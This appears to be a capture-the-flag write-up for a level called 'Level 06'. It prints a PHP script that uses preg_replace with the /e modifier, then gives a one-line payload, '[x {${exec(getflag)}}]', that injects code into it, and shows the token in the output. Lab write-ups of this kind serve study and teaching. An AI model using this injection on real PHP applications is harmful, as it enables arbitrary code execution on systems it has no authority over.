# Level 06

```bash
cat level06.php

#!/usr/bin/php
<?php
function y($m)
{
    $m = preg_replace("/\./", " x ", $m);
    $m = preg_replace("/@/", " y", $m);
    return $m;
}
function x($y, $z)
{
    $a = file_get_contents($y);
    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
    $a = preg_replace("/\[/", "(", $a);
    $a = preg_replace("/\]/", ")", $a);
    return $a;
}
$r = x($argv[1], $argv[2]);
print $r;
?>
```

The script goes through an input file and makes some character replacements. It appears to use the 'e' regex modifier in x() along with a wildcard. This modifier allows the [use of php code](https://www.php.net/manual/en/reference.pcre.pattern.modifiers.php) within the argument.

By matching the `preg_replace pattern [x .*]`, we can inject our own code to the script.

```bash
echo "[x {${exec(getflag)}}]" > /tmp/inj
```

```bash
./level06 /tmp/inj
# HP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
# PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1
```